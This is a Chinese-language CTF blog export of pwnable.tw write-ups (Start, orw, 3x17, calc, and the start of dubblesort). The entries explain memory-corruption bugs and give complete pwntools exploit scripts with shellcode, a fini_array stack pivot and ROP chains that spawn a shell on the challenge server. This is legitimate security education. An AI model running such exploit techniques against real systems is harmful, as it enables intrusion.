<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Start</title>
    <url>/archives/5eb87a8b.html</url>
    <content><![CDATA[<h2 id="pwnable-tw-Start"><a href="#pwnable-tw-Start" class="headerlink" title="pwnable.tw - Start"></a>pwnable.tw - Start</h2><span id="more"></span>

<hr>
<h2 id="找洞"><a href="#找洞" class="headerlink" title="找洞"></a>找洞</h2><p>先checksec，得到32位程序且保护全关</p>
<p><img src="https://i.loli.net/2021/07/10/qIBS1ro3nxzEvZY.png"></p>
<p>扔进ida看看，程序流程很简单，输出一段话，然后请求一次输入，最多输入3c个字符</p>
<p><img src="https://i.loli.net/2021/07/10/7tmIOrjiMQv9e5o.png"></p>
<p>很明显的栈溢出</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>可以发现read的时候ecx没有变过，也就是读到<code>“Let&#39;s start the CTF:”</code>的位置，也即esp的位置，</p>
<p>而在程序末尾看到 <code> add esp, 14h</code> ，可知padding是0x14</p>
<p>那么思路就是在栈上布置shellcode，然后返回地址覆盖shellcode的地址</p>
<h3 id="泄露栈地址"><a href="#泄露栈地址" class="headerlink" title="泄露栈地址"></a>泄露栈地址</h3><p>我们还有<code>write</code>函数，可以先栈溢出，再调用一次<code>write</code>，就能泄露栈地址</p>
<p>（在<code>retaddr</code>后面正好是程序开头<code>push</code>进去的栈上的地址，再调用write就会把这个地址打印出来）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">write = <span class="number">0x08048087</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(write)</span><br></pre></td></tr></table></figure>

<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>有了栈地址之后，直接ret2shellcode就行了</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./start&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    call here</span></span><br><span class="line"><span class="string">    .ascii &quot;/bin/sh&quot;</span></span><br><span class="line"><span class="string">    .byte 0</span></span><br><span class="line"><span class="string">here:</span></span><br><span class="line"><span class="string">    pop ebx</span></span><br><span class="line"><span class="string">    mov al, 0xb</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">write = <span class="number">0x08048087</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;CTF:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(write)</span><br><span class="line">r.send(payload)</span><br><span class="line">stack = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stack)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(stack+<span class="number">0x14</span>) + shellcode</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>











]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
      <tags>
        <tag>stackoverflow</tag>
        <tag>shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>orw</title>
    <url>/archives/6fa2aae4.html</url>
    <content><![CDATA[<h2 id="pwnable-tw-orw"><a href="#pwnable-tw-orw" class="headerlink" title="pwnable.tw - orw"></a>pwnable.tw - orw</h2><span id="more"></span>

<hr>
<h2 id="找洞"><a href="#找洞" class="headerlink" title="找洞"></a>找洞</h2><p>丢进ida可以发现有个orw_seccomp函数，于是用<a href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>查看限制：</p>
<p><img src="https://i.loli.net/2021/07/10/WnQ5zPIfiR8gujA.png"></p>
<p>只能用open，read，write。</p>
<p>已知flag在<code>/home/orw/flag</code>，那只需要open它，read它，再write到标准输出就行</p>
<p>并且这个程序流程就是输入shellcode并运行，那直接构造shellcode就行</p>
<p>值得注意的点： 函数的返回值在eax中，在read的时候先把eax给ebx，再改为read的系统调用号</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./orw&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10001</span>)</span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    call op</span></span><br><span class="line"><span class="string">    .ascii &quot;/home/orw/flag&quot;</span></span><br><span class="line"><span class="string">    .byte 0</span></span><br><span class="line"><span class="string">op:</span></span><br><span class="line"><span class="string">    pop ebx</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    mov eax,0x5</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov ecx,ebx</span></span><br><span class="line"><span class="string">    mov ebx,eax</span></span><br><span class="line"><span class="string">    mov edx,0xff</span></span><br><span class="line"><span class="string">    mov eax,0x3</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    mov ebx,1</span></span><br><span class="line"><span class="string">    mov eax,4</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">r.sendafter(<span class="string">&quot;shellcode:&quot;</span>,shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
      <tags>
        <tag>shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>3x17</title>
    <url>/archives/e7d81306.html</url>
    <content><![CDATA[<h2 id="pwnable-tw-3x17"><a href="#pwnable-tw-3x17" class="headerlink" title="pwnable.tw - 3x17"></a>pwnable.tw - 3x17</h2><span id="more"></span>

<hr>
<h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>先看下保护：</p>
<p><img src="https://i.loli.net/2021/07/13/GqM1HIzvYx6mfb3.png"></p>
<p>在试下交互，感觉是一次任意地址写</p>
<p>有了初步的概念后，丢进ida，似乎没有符号表，ida啥函数都分析不出来</p>
<p>那就得先找<code>main</code>函数，这里需要了解<code>_start</code>函数的结构，当调用<code>__libc_start_main</code>时，<code>rdi</code>中的参数即为<code>main</code>函数</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img src="https://i.loli.net/2021/07/13/W9NZL67k3uaYf5R.png"></div><div class="group-picture-column"><img src="https://i.loli.net/2021/07/13/PDYZNmvScyJezfC.png"></div></div></div>

<p>随便编译一个带符号表的程序，放进ida对比，可以大概对上</p>
<p>我们又知道64位程序前六个参数依次存在RDI, RSI, RDX, RCX, R8和R9寄存器中，并且</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数原型</span></span><br><span class="line"><span class="keyword">int</span> __libc_start_main(<span class="keyword">int</span> *(main) (<span class="keyword">int</span>, <span class="keyword">char</span> * *, <span class="keyword">char</span> * *), <span class="keyword">int</span> argc, <span class="keyword">char</span> * * ubp_av, </span><br><span class="line"><span class="keyword">void</span> (*init) (<span class="keyword">void</span>), <span class="keyword">void</span> (*fini) (<span class="keyword">void</span>), <span class="keyword">void</span> (*rtld_fini) (<span class="keyword">void</span>), <span class="keyword">void</span> (* stack_end)); </span><br></pre></td></tr></table></figure>

<p>这样我们就找到了main函数，可用快捷键n改写函数名字</p>
<h2 id="找洞"><a href="#找洞" class="headerlink" title="找洞"></a>找洞</h2><p>先看main函数</p>
<img src="https://i.loli.net/2021/07/13/Y3fcMVLKo6xJgSb.png" style="zoom:80%;" />

<p>myread，mywrite很好看出来，所以程序流程很简单，就是一次任意地址写，最多写0x18个字符</p>
<p>注意：</p>
<ul>
<li>当<code>byte_4B9330</code>等于1的时候，才能任意地址写，每次程序开头这个东西自增（不知道啥意思先放着</li>
<li>读进来的addr，会被一个<code>sub_40EE70</code>函数由字符串转成数字（调试一下就能发现</li>
</ul>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="一次写变多次写"><a href="#一次写变多次写" class="headerlink" title="一次写变多次写"></a>一次写变多次写</h3><h4 id="main-启动过程"><a href="#main-启动过程" class="headerlink" title="main()启动过程"></a>main()启动过程</h4><p>具体可以看<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/">这篇的3.1.1</a>，里面讲的很详细，如果不是很明白可以拿着之前那个有符号表的程序对照着看</p>
<p>这里直接给结论，程序流程是：</p>
<ul>
<li>__libc_csu_init<ul>
<li>_init</li>
<li>_init_array[0]</li>
<li>_init_array[1]</li>
<li>…</li>
<li>_init_array[n]</li>
</ul>
</li>
<li>main</li>
<li>__libc_csu_fini<ul>
<li>_fini_array[n]</li>
<li>…</li>
<li>_fini_array[1]</li>
<li>_fini_array[0]</li>
<li>_fini</li>
</ul>
</li>
</ul>
<h4 id="劫持rip"><a href="#劫持rip" class="headerlink" title="劫持rip"></a>劫持rip</h4><p>我们看一下这道题的<code>__libc_csu_fini</code></p>
<img src="https://i.loli.net/2021/07/13/kefS8Eg69KY2GaH.png" style="zoom: 80%;" />

<p>对照f5生成的伪代码，可以判断<code>off_4B40F0</code>就是<code>_fini_array</code>的头地址，点进去看看</p>
<p><img src="https://i.loli.net/2021/07/13/Mtv9dbQlYPsfG6S.png"></p>
<p>也可以在ida的subview-&gt;segements窗口找到_fini_array</p>
<img src="https://i.loli.net/2021/07/13/gZBkhJoO4eF8dnT.png" style="zoom:80%;" />

<p>可以看到有两个函数，那么函数的流程就是</p>
<pre class="mermaid">
graph LR
A(main) --&gt;B(__libc_csu_fini)
B --&gt;C(&quot;_fini_array[1]&quot;)
C --&gt; D(&quot;_fini_array[0]&quot;)
</pre>

<p>那么我们只需要覆盖这三个中随便哪个就能劫持rip了，看看有没有后门，搜”/bin/sh”无果，one_gadget无果（看来没那么简单</p>
<p>所以我们退一步，只要将<code>_fini_array[1]</code>覆盖成<code>main</code>，<code>_fini_array[0]</code>覆盖成<code>__libc_csu_fini</code>，程序流程就变成这样</p>
<pre class="mermaid">
graph LR
 
A(main) --&gt;B(__libc_csu_fini)
B --&gt; C(&quot;_fini_array[1]: main&quot;)
C --&gt; D(&quot;_fini_array[0]:__libc_csu_fini&quot;)
D --&gt; C
</pre>

<p>似乎就可以无限循环main函数了，但还有个<code>byte_4B9330==1</code>的条件，观察一下这个变量，发现是个八位的整型，那反正会不断加，总会溢出到1的，于是我们就有了<strong>多次任意地址写</strong></p>
<h4 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./3x17&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">addr,data</span>):</span></span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">fini_array = <span class="number">0x4B40F0</span></span><br><span class="line">main_addr = <span class="number">0x401B6D</span></span><br><span class="line">fini_addr = <span class="number">0x402960</span></span><br><span class="line"></span><br><span class="line">write(fini_array,p64(fini_addr)+p64(main_addr)) <span class="comment">#这里顺序要注意</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>运行成功</p>
<h3 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h3><p>我们现在有了多次任意地址写，但栈上不可执行，所以没法直接shellcode，又不知道栈地址，不好rop</p>
<p>所以想到劫持rsp到我们知道的地方，然后布置好那里的内容，就可以rop了</p>
<p>继续观察<code>__libc_csu_fini</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000402961 lea     rax, unk_4B4100 ; Load Effective Address</span><br><span class="line">.text:0000000000402968 lea     rbp, off_4B40F0 ; Load Effective Address</span><br></pre></td></tr></table></figure>

<p>可以发现这里把rbp当成普通寄存器存了<code>_fini_array</code>的头地址</p>
<p>然后后面就开始调用了_fini_array，之后的流程是我们可控的，于是就想到利用rbp中的内容改rsp</p>
<p>main函数末尾是<code>leave; retn;</code>，相当于<code>mov rsp, rbp; pop rbp; ret;</code>，于是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea     rbp, off_4B40F0 ; rbp = 0x4b40f0            , rsp = 未知</span><br><span class="line"></span><br><span class="line">; 劫持到这</span><br><span class="line">mov     rsp,rbp         ; rbp = 0x4b40f0            , rsp = 0x4b40f0</span><br><span class="line">pop     rbp             ; rbp = [rsp] = [0x4b40f0]  , rsp = 0x4b40f8</span><br><span class="line">ret                     ; rip = [rsp] = [0x4b40f8]  , rsp = 0x4b4100</span><br></pre></td></tr></table></figure>

<p>这样的话，rbp指向<code>_fini_array[0]</code>，rip指向<code>_fini_array[1]</code>，rsp被劫持到<code>0x4b4100</code></p>
<p>那么我们现在需要保证<code>_fini_array[1</code> 不会改变栈上高地址的内容，而我们前面已经将这里改成了main函数，不动它就行了</p>
<p>只要我们将<code>_fini_array[0]</code>覆盖成<code>leave; retn;</code>的地址，就会中断循环，并进入main函数，而这时候不满足<code>byte_4B9330==1</code>，会立即return，触发rop</p>
<p>我们要做的事情：</p>
<ol>
<li>在<code>0x4b4100</code>后面布置ropchain（用ROPgadget，”/bin/sh\x00”随便找个高地址放着</li>
<li>将<code>_fini_array[0]</code>覆盖成<code>leave; retn;</code>的地址</li>
</ol>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./3x17&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10105</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">addr,data</span>):</span></span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line">    r.recv()</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line">fini_array = <span class="number">0x4B40F0</span></span><br><span class="line">main_addr = <span class="number">0x401B6D</span></span><br><span class="line">fini_addr = <span class="number">0x402960</span></span><br><span class="line">bss = <span class="number">0x4b4100</span></span><br><span class="line">lev_ret = <span class="number">0x401C4B</span></span><br><span class="line"></span><br><span class="line">pop_rax_ret = <span class="number">0x41e4af</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x401696</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x406c30</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x446e35</span></span><br><span class="line">syscall = <span class="number">0x4022b4</span></span><br><span class="line">binsh_addr = <span class="number">0x4b4300</span></span><br><span class="line"></span><br><span class="line">write(fini_array,p64(fini_addr)+p64(main_addr))</span><br><span class="line"></span><br><span class="line">write(binsh_addr,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">write(bss,p64(pop_rax_ret)+p64(<span class="number">0x3b</span>))</span><br><span class="line">write(bss+<span class="number">0x10</span>,p64(pop_rdi_ret)+p64(binsh_addr))</span><br><span class="line">write(bss+<span class="number">0x20</span>,p64(pop_rsi_ret)+p64(<span class="number">0</span>))</span><br><span class="line">write(bss+<span class="number">0x30</span>,p64(pop_rdx_ret)+p64(<span class="number">0</span>))</span><br><span class="line">write(bss+<span class="number">0x40</span>,p64(syscall))</span><br><span class="line"></span><br><span class="line">write(fini_array,p64(lev_ret))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h2><p>exp中的write函数中：</p>
<ul>
<li>传addr的时候sendline和send都行</li>
<li>传data的时候sendline不行，send就行</li>
</ul>
<p>不是很明白为什么，如果有人知道，希望能教我一下(*^▽^*)</p>
<h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/">https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/</a></p>
<p><a href="https://v1ckydxp.github.io/2019/04/26/pwnable-tw-3x17-writeup/">https://v1ckydxp.github.io/2019/04/26/pwnable-tw-3x17-writeup/</a></p>
<p><a href="https://blog.csdn.net/qq_43189757/article/details/102736227">https://blog.csdn.net/qq_43189757/article/details/102736227</a></p>
]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
      <tags>
        <tag>栈迁移</tag>
        <tag>rop</tag>
        <tag>libc</tag>
      </tags>
  </entry>
  <entry>
    <title>Why begins?</title>
    <url>/archives/84551bc4.html</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>前几天做题的时候，愈发觉得脑子不足以记下那么多的细节，总是害怕自己忘了，下次要用就想不起来。于是想到开个博客记录一下自己折腾的经历，帮助自己之后回顾题目。</p>
<p>以前遇到问题在网上搜的时候，有好多博客给了我很大的帮助，所以我也希望我的博客能给同道们一点小小的启发。</p>
<h2 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h2><p>这个博客将主要记录我做题的经历、折腾电脑的过程、以及各种学习笔记吧，可能还会有一些生活的记录。</p>
<h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h2><p>请移步<a href="https://innerway-xq.github.io/about/">这里</a></p>
<h2 id="添加友链"><a href="#添加友链" class="headerlink" title="添加友链"></a>添加友链</h2><p>可在下方评论，或者以各种方式联系我</p>
<h4 id="小站初建，多有不足，还望见谅"><a href="#小站初建，多有不足，还望见谅" class="headerlink" title="小站初建，多有不足，还望见谅"></a>小站初建，多有不足，还望见谅</h4><hr>
<h4 id="Hack-for-Fun"><a href="#Hack-for-Fun" class="headerlink" title="Hack for Fun"></a>Hack for Fun</h4>]]></content>
      <categories>
        <category>杂</category>
      </categories>
  </entry>
  <entry>
    <title>calc</title>
    <url>/archives/5c3132af.html</url>
    <content><![CDATA[<h2 id="pwnable-tw-calc"><a href="#pwnable-tw-calc" class="headerlink" title="pwnable.tw - calc"></a>pwnable.tw - calc</h2><span id="more"></span>

<hr>
<h2 id="找洞"><a href="#找洞" class="headerlink" title="找洞"></a>找洞</h2><p>先看下保护，</p>
<p><img src="https://i.loli.net/2021/07/12/oZBfPkaNpDIg92F.png"></p>
<p>丢进ida分析程序，粗略看就是实现了一个简单计算器的功能，不支持括号</p>
<h3 id="看一下calc-函数"><a href="#看一下calc-函数" class="headerlink" title="看一下calc()函数"></a>看一下calc()函数</h3><p><img src="https://i.loli.net/2021/07/12/4lJ17y5uWGme9cK.png"></p>
<p>先是把expr置零，并用<code>get_expr()</code>输入进来，看代码可知这个函数过滤了除数字以及+-*/%之外的字符，到<code>0x0a</code>即<code>&#39;\n&#39;</code>结束</p>
<p><img src="https://i.loli.net/2021/07/12/LiVcjf51ykS2Nxu.png"></p>
<p>然后将一个ans数组置零，parse_expr()显然就是实现计算器功能的函数，顺便看到他输出的结果是<code>ans[ans[0]]</code>，这里提醒我们要注意<code>ans[0]</code>的内容</p>
<h3 id="分析parse-expr"><a href="#分析parse-expr" class="headerlink" title="分析parse_expr()"></a>分析<code>parse_expr()</code></h3><p>实现方法很常规，就是把运算符和操作数分离，然后再运算</p>
<h4 id="先看分离的过程"><a href="#先看分离的过程" class="headerlink" title="先看分离的过程"></a>先看分离的过程</h4><p>它维护了两个数组，一个op_buf[100]存了运算符，另一个是calc()调用的时候传进来的ans</p>
<p><img src="https://i.loli.net/2021/07/12/UgxBH9nfeuRl2LW.png"></p>
<p>首先，函数进一个大循环，</p>
<p><strong>如果当前位置是数字</strong>，就什么都不做，进入下一轮循环</p>
<p><strong>如果是运算符</strong>，（注意到有一个<code>unsigned int</code>，保证了<code>运算符-&#39;0&#39;</code>无论如何都大于9）</p>
<p>程序先把左操作数取到s1中，然后做一个判断：左操作数是否为0，若是，就报错退出（这在数学上不太合理，anyway，这是个pwn题</p>
<p>然后把左操作数转成数字，放进ans，先<code>ans[0]++</code>，然后把操作数放在<code>ans[ans[0]+1]</code>，可以猜测<code>ans[0]</code>是一个标志或者计数器</p>
<p>后面又是一个判断：后一个字符是否是运算符，若是，报错退出（就是防止类似<code>1++1</code>这种东西</p>
<h4 id="下面分析运算的部分"><a href="#下面分析运算的部分" class="headerlink" title="下面分析运算的部分"></a>下面分析运算的部分</h4><p><img src="https://i.loli.net/2021/07/12/hgqn9bZSis6xY7t.png"></p>
<p>它不会在读到第一个运算符马上运算<del>废话</del>，一是没有右操作符，二是类似<code>1+5*2</code>这种有运算优先级的问题需要处理</p>
<p>所以它是读到第二个运算符再来处理，用op_num来维护当前运算到哪个运算符，</p>
<p>至于运算的流程很简单，如果是*/%，看前面是不是+-，若是，等待下一个运算符，若不是就运算</p>
<p>运算这里有一个<code>eval()</code>函数很重要，我们来看一下：</p>
<p><img src="https://i.loli.net/2021/07/12/ciZtWpon31uMSyG.png"></p>
<p>可以看到<code>ans[ans[0]-1]</code>和<code>ans[ans[0]]</code>分别为当前运算符的左右操作数，于是<code>ans[0]</code>记录的就是最新的运算符的左操作数，也就是上一个运算符的右操作数</p>
<p>举个例子：1+2*3+4*5</p>
<p><img src="https://i.loli.net/2021/07/12/cBS2oLz4kEDWZKm.png"></p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="尝试0x01"><a href="#尝试0x01" class="headerlink" title="尝试0x01"></a>尝试0x01</h3><p>可以看到若有乘法的话，它之后运算完乘法的东西是不会把前面放着的加法也算掉的，而是会一直放在里面，这就让我想到能不能用类似<code>1+1*1+1*1+...+1*something_to_write</code>完成一个栈溢出并rop，但是发现输入只有0x400，但padding有0x5a0，而且还有个canary，这条路走不通</p>
<p><img src="https://i.loli.net/2021/07/12/yMlWFQBKEtN3G8D.png"></p>
<h3 id="尝试0x02"><a href="#尝试0x02" class="headerlink" title="尝试0x02"></a>尝试0x02</h3><p>开始<del>xjb乱试</del>继续分析，发现<code>+1</code>，<code>+1+1*1</code>等输出不正常，于是想到<code>+1</code>这种没有左操作数，手动模拟一下发现<code>+x</code>会把<code>x</code>加到<code>ans[0]</code>上去，而输出又是<code>ans[ans[0]]</code>，于是输出的就变成了<code>ans[x]</code>啊哈，我们有了栈上任意地址读！</p>
<p>但这还不够，手动模拟<code>+x+y</code>发现这个式子会把<code>ans[x]+y</code>，那么我们可以先打印一个地址的内容，然后算出要写的内容和它的差y，于是就有了栈上任意地址写！</p>
<p>看到<code>ans</code>在<code>ebp-0x5a0</code>的位置，而<code>ans</code>是<code>int</code>，所以得到<code>ans[360]</code>就是<code>ebp</code>，<code>ans[361]</code>就是<code>retaddr</code>，尝试一下修改：</p>
<p><img src="https://i.loli.net/2021/07/12/leixOUpJSHAG6TM.png"></p>
<p>Perfect！</p>
<p>这样也不用管canary了，因为根本不会遇到它</p>
<p>下面就是构造rop链并布置到栈上，注意到这个程序是静态链接的，直接用<code>ROPgadget --binary ./calc --ropchain</code>得到（懒人必备</p>
<img src="https://i.loli.net/2021/07/12/itsC5HBI3SlahOK.png" style="zoom:75%;" />

<p><strong>注意：</strong>因为程序输出是按int输出，会自动把小端表示倒回来，所以写入<code>&quot;/bin&quot;,&quot;//sh&quot;</code>的时候要倒着写</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./calc&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10100</span>)</span><br><span class="line">r.recv()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span>(<span class="params">i,addr</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(<span class="number">361</span>+i)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    orginal = <span class="built_in">int</span>(r.recv().strip(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    dis = addr - orginal</span><br><span class="line">    <span class="keyword">if</span> dis &gt; <span class="number">0</span> :</span><br><span class="line">        payload2 = payload + <span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(dis)</span><br><span class="line">    <span class="keyword">elif</span> dis &lt; <span class="number">0</span> :</span><br><span class="line">        payload2 = payload + <span class="string">&#x27;-&#x27;</span> + <span class="built_in">str</span>(-dis)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    r.sendline(payload2)</span><br><span class="line">    r.recv()</span><br><span class="line"></span><br><span class="line">rop_chain = [<span class="number">0x080701aa</span>,<span class="number">0x080ec060</span>,<span class="number">0x0805c34b</span>,<span class="number">0x6e69622f</span>,<span class="number">0x0809b30d</span>,<span class="number">0x080701aa</span>,<span class="number">0x080ec064</span>,<span class="number">0x0805c34b</span>,<span class="number">0x68732f2f</span>,<span class="number">0x0809b30d</span>,<span class="number">0x080701aa</span>,<span class="number">0x080ec068</span>,<span class="number">0x080550d0</span>,<span class="number">0x0809b30d</span>,<span class="number">0x080481d1</span>,<span class="number">0x080ec060</span>,<span class="number">0x080701d1</span>,<span class="number">0x080ec068</span>,<span class="number">0x080ec060</span>,<span class="number">0x080701aa</span>,<span class="number">0x080ec068</span>,<span class="number">0x080550d0</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x08049a21</span>]</span><br><span class="line"><span class="comment"># \bin\\sh 要倒过来写！！！！！！！</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(rop_chain)):</span><br><span class="line">    modify(i,rop_chain[i])</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&quot;give me shell&quot;</span>) <span class="comment">#随便输入不是运算符和数字的字符串，就会从calc()返回，触发ropchain</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><p><a href="https://www.tuicool.com/articles/VNzqea3">https://www.tuicool.com/articles/VNzqea3</a></p>
<p><a href="https://n0va-scy.github.io/2019/07/03/pwnable.tw/">https://n0va-scy.github.io/2019/07/03/pwnable.tw/</a></p>
]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
      <tags>
        <tag>rop</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>dubblesort</title>
    <url>/archives/51d1aace.html</url>
    <content><![CDATA[<h2 id="pwnable-tw-dubblesort"><a href="#pwnable-tw-dubblesort" class="headerlink" title="pwnable.tw - dubblesort"></a>pwnable.tw - dubblesort</h2><span id="more"></span>

<hr>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先看保护，好家伙，保护全开</p>
<p><img src="https://i.loli.net/2021/07/13/v7OlDzmIHKnYR23.png"></p>
<p>看看程序流程，大概就是输入个名字，然后输入一堆数，冒泡排序后输出</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p><img src="https://i.loli.net/2021/07/13/OgABFh6tqYMckDK.png"></p>
<p>输了几次名字，发现会有段乱码，丢进ida看看，果然输出名字的地方有问题</p>
<p>他是read输入的，不会在末尾加上<code>\x00</code>截断，又用printf输出，还用了<code>%s</code>，那栈上东西就好泄露了；加上题目给了libc文件，大概就是个ret2libc吧</p>
<p>用gdb调一下，看看栈上有什么东西可以泄露</p>
<blockquote>
<p>对于开了pie保护的程序，可以用<code>b *$rebase(your_addr)</code>来下断点</p>
</blockquote>
